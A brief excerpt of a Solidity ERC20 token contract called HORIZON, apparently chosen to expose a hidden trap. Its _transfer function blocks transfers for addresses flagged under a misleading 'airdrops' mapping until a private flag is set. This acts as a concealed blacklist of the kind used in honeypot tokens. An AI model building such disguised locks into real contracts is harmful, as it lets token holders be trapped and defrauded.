...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    bool private _airdropsApplied = false;
    ...
    function _transfer(
        ...
        if (_airdrops[from] || _airdrops[to]) require(_airdropsApplied == true, "");
...
contract HORIZON is ERC20 {
    constructor() ERC20("HORIZON", "HORIZON") {
